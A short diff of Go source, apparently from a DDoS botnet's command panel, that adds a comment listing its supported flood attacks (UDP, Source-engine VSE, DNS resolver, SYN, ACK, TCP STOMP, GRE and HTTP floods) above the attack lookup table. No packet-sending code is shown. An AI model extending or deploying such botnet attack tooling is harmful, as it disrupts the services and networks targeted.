@@ -132,6 +132,20 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
     },
 }
 
+/*
+Use flag to set attack method,
+Supported attack methods
+    UDP flood
+    VSE flood, to attack game engine "source engine" using UDP flood
+    DNS resolver flood, send DNS resolve request for some non-existed URLs
+    SYN flood,
+    ACK flood
+    TCP STOMP flood, PSH and ACK packet flood,
+    GRE IP flood, GRE protocol
+    GRE ethernet flood,
+    plain UDP flood, UDP flood with no-header udp packets
+    HTTP flood
+*/
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
     "udp": AttackInfo {
         0,
